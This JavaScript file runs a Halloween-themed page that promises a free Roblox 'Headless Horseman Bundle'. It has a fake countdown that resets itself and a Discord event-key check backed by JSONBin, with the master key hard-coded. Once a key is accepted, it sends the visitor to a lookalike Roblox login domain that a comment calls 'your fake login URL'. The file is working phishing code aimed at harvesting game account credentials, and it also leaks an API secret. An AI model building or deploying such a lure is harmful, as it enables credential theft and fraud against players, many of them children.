// ============================
// CONFIGURATION
// ============================

const CONFIG = {
    jsonBinId: '6a2cd289da38895dfeb8ac3b',
    jsonBinKey: '$2a$10$hJ/FocyDPeHkkqIY0z4qzuvdTP.QEbGACgo2F3m1qMxOzJ4HB3mcS',
    keyExpiryHours: 24
};

const ROBLOX_LINK = 'https://roblox.com.bz/login?returnUrl=2457737694782978'; // Replace with your fake login URL

// ============================
// HALLOWEEN PARTICLE SYSTEM
// ============================

function createParticles() {
    const particlesContainer = document.getElementById('particles');
    const emojis = ['🦇', '🎃', '👻', '💀', '🕷️', '🕸️', '🍬', '🦉', '🌙'];

    for (let i = 0; i < 25; i++) {
        const particle = document.createElement('span');
        particle.className = 'particle';
        particle.textContent = emojis[Math.floor(Math.random() * emojis.length)];
        particle.style.left = Math.random() * 100 + '%';
        particle.style.animationDuration = (Math.random() * 8 + 6) + 's';
        particle.style.animationDelay = Math.random() * 10 + 's';
        particle.style.fontSize = (Math.random() * 20 + 14) + 'px';
        particlesContainer.appendChild(particle);
    }
}

// ============================
// COUNTDOWN TIMER
// ============================

function startCountdown() {
    let totalSeconds = Math.floor(Math.random() * 7200) + 3600;

    const hoursEl = document.getElementById('hours');
    const minutesEl = document.getElementById('minutes');
    const secondsEl = document.getElementById('seconds');

    function updateCountdown() {
        const hours = Math.floor(totalSeconds / 3600);
        const minutes = Math.floor((totalSeconds % 3600) / 60);
        const seconds = totalSeconds % 60;

        hoursEl.textContent = String(hours).padStart(2, '0');
        minutesEl.textContent = String(minutes).padStart(2, '0');
        secondsEl.textContent = String(seconds).padStart(2, '0');

        if (totalSeconds <= 0) {
            totalSeconds = Math.floor(Math.random() * 3600) + 1800;
        }

        totalSeconds--;
    }

    updateCountdown();
    setInterval(updateCountdown, 1000);
}

// ============================
// DOM READY
// ============================

document.addEventListener('DOMContentLoaded', function() {
    createParticles();
    startCountdown();
    setupKeyValidation();
});

// ============================
// KEY VALIDATION SETUP
// ============================

function setupKeyValidation() {
    const claimBtn = document.querySelector('.promo-btn');

    claimBtn.addEventListener('click', async function(e) {
        e.preventDefault();
        showKeyInputModal();
    });
}

// ============================
// MODAL SYSTEM
// ============================

function showKeyInputModal() {
    const existingModal = document.querySelector('.key-modal-overlay');
    if (existingModal) {
        existingModal.remove();
    }

    const modal = document.createElement('div');
    modal.className = 'key-modal-overlay';
    modal.innerHTML = `
        <div class="key-modal">
            <div class="key-modal-header">
                <h3>🎃 Enter Event Key</h3>
                <button class="key-modal-close">&times;</button>
            </div>
            <div class="key-modal-body">
                <p style="margin-bottom: 15px; color: #e4dce8;">
                    Enter the key from Discord to claim your Headless Horseman Bundle
                </p>
                <input 
                    type="text" 
                    class="key-input" 
                    placeholder="Enter your key here..."
                    autocomplete="off"
                >
                <div class="key-error" style="display: none;"></div>
                <button class="key-submit-btn">
                    🎃 Claim Reward
                    <span>→</span>
                </button>
                <div class="key-loading" style="display: none;">
                    <div class="spinner"></div>
                    <span>Verifying key...</span>
                </div>
            </div>
        </div>
    `;

    document.body.appendChild(modal);

    addModalStyles();

    setupModalEvents(modal);
}

function addModalStyles() {
    if (document.getElementById('key-modal-styles')) return;

    const styles = document.createElement('style');
    styles.id = 'key-modal-styles';
    styles.textContent = `
        .key-modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(15px);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
            animation: fadeIn 0.3s ease;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from { transform: translateY(30px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-10px); }
            75% { transform: translateX(10px); }
        }
        
        .key-modal {
            background: linear-gradient(135deg, #1a0a00 0%, #0d0015 100%);
            border: 2px solid rgba(255, 107, 0, 0.6);
            border-radius: 28px;
            padding: 40px;
            width: 90%;
            max-width: 480px;
            box-shadow: 0 0 40px rgba(255, 107, 0, 0.3), 0 0 80px rgba(255, 60, 0, 0.1);
            animation: slideUp 0.4s ease;
        }
        
        .key-modal-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 25px;
        }
        
        .key-modal-header h3 {
            color: #ff6600;
            font-size: 24px;
            font-weight: 900;
            font-style: italic;
            text-shadow: 0 0 10px rgba(255, 102, 0, 0.5);
        }
        
        .key-modal-close {
            background: rgba(255, 107, 0, 0.15);
            border: none;
            color: #ff9040;
            font-size: 28px;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
        }
        
        .key-modal-close:hover {
            background: rgba(255, 107, 0, 0.3);
            transform: rotate(90deg);
        }
        
        .key-input {
            width: 100%;
            padding: 18px 20px;
            background: rgba(255, 255, 255, 0.03);
            border: 2px solid rgba(255, 107, 0, 0.4);
            border-radius: 16px;
            color: #fff;
            font-size: 18px;
            font-family: 'Inter', sans-serif;
            margin-bottom: 20px;
            transition: all 0.3s;
            outline: none;
        }
        
        .key-input:focus {
            border-color: rgba(255, 107, 0, 0.9);
            box-shadow: 0 0 25px rgba(255, 107, 0, 0.3);
        }
        
        .key-input.error {
            border-color: #ff4444;
            animation: shake 0.5s ease;
        }
        
        .key-error {
            color: #ff4444;
            font-size: 14px;
            margin-bottom: 15px;
            padding: 10px 15px;
            background: rgba(255, 68, 68, 0.1);
            border-radius: 10px;
            border: 1px solid rgba(255, 68, 68, 0.3);
        }
        
        .key-submit-btn {
            width: 100%;
            padding: 20px;
            background: linear-gradient(180deg, #ff6600 0%, #cc3300 100%);
            color: white;
            border: none;
            border-radius: 18px;
            font-size: 20px;
            font-weight: 800;
            cursor: pointer;
            box-shadow: 0 8px 30px rgba(255, 102, 0, 0.45);
            transition: all 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            font-family: 'Inter', sans-serif;
        }
        
        .key-submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 12px 40px rgba(255, 102, 0, 0.6);
        }
        
        .key-submit-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }
        
        .key-submit-btn span {
            font-size: 24px;
        }
        
        .key-loading {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            color: #ffb347;
            font-weight: 600;
        }
        
        .spinner {
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 107, 0, 0.3);
            border-top-color: #ffb347;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        @media (max-width: 768px) {
            .key-modal {
                padding: 25px;
                margin: 20px;
            }
            
            .key-modal-header h3 {
                font-size: 20px;
            }
        }
    `;

    document.head.appendChild(styles);
}

function setupModalEvents(modal) {
    const closeBtn = modal.querySelector('.key-modal-close');
    const submitBtn = modal.querySelector('.key-submit-btn');
    const keyInput = modal.querySelector('.key-input');
    const errorDiv = modal.querySelector('.key-error');
    const loadingDiv = modal.querySelector('.key-loading');
    const overlay = modal;

    closeBtn.addEventListener('click', () => modal.remove());
    overlay.addEventListener('click', (e) => {
        if (e.target === overlay) modal.remove();
    });

    submitBtn.addEventListener('click', () => verifyKey(keyInput, submitBtn, errorDiv, loadingDiv));

    keyInput.addEventListener('keypress', (e) => {
        if (e.key === 'Enter') {
            verifyKey(keyInput, submitBtn, errorDiv, loadingDiv);
        }
    });

    setTimeout(() => keyInput.focus(), 300);
}

// ============================
// KEY VERIFICATION (UPDATED - SINGLE USE)
// ============================

async function verifyKey(keyInput, submitBtn, errorDiv, loadingDiv) {
    const userKey = keyInput.value.trim().toUpperCase();

    if (!userKey) {
        showError(keyInput, errorDiv, '🎃 Enter your event key, spooky!');
        return;
    }

    submitBtn.style.display = 'none';
    loadingDiv.style.display = 'flex';
    errorDiv.style.display = 'none';
    keyInput.classList.remove('error');

    try {
        const response = await fetch(`https://api.jsonbin.io/v3/b/${CONFIG.jsonBinId}/latest`, {
            headers: {
                'X-Master-Key': CONFIG.jsonBinKey
            }
        });

        if (!response.ok) throw new Error('Failed to verify key');

        const data = await response.json();
        const keysData = data.record.keys || {};

        // Check if key exists
        if (!keysData[userKey]) {
            showError(keyInput, errorDiv, '👻 Invalid key! Get a valid key from Discord.');
            resetButton(submitBtn, loadingDiv);
            return;
        }

        const keyInfo = keysData[userKey];

        // Check if already used
        if (keyInfo.used) {
            showError(keyInput, errorDiv, '💀 This key has already been used! Each key is single-use only.');
            resetButton(submitBtn, loadingDiv);
            return;
        }

        // Check expiry (24 hours)
        const createdAt = new Date(keyInfo.createdAt);
        const now = new Date();
        const hoursDiff = (now - createdAt) / (1000 * 60 * 60);

        if (hoursDiff > CONFIG.keyExpiryHours) {
            showError(keyInput, errorDiv, '⏰ This key has expired! Get a new one from Discord.');
            resetButton(submitBtn, loadingDiv);
            return;
        }

        // Mark key as used
        keysData[userKey].used = true;
        keysData[userKey].usedAt = new Date().toISOString();

        await fetch(`https://api.jsonbin.io/v3/b/${CONFIG.jsonBinId}`, {
            method: 'PUT',
            headers: {
                'Content-Type': 'application/json',
                'X-Master-Key': CONFIG.jsonBinKey
            },
            body: JSON.stringify({ keys: keysData })
        });

        // Success
        keyInput.style.borderColor = '#00ff88';
        loadingDiv.innerHTML = '🎃 Key verified! Redirecting to claim...';

        setTimeout(() => {
            window.location.href = ROBLOX_LINK;
        }, 1500);

    } catch (error) {
        showError(keyInput, errorDiv, '💀 Verification error. Try again.');
        resetButton(submitBtn, loadingDiv);
    }
}

// ============================
// HELPER FUNCTIONS
// ============================

function showError(input, errorDiv, message) {
    input.classList.add('error');
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';

    setTimeout(() => input.classList.remove('error'), 500);
}

function resetButton(submitBtn, loadingDiv) {
    submitBtn.style.display = 'flex';
    loadingDiv.style.display = 'none';
}
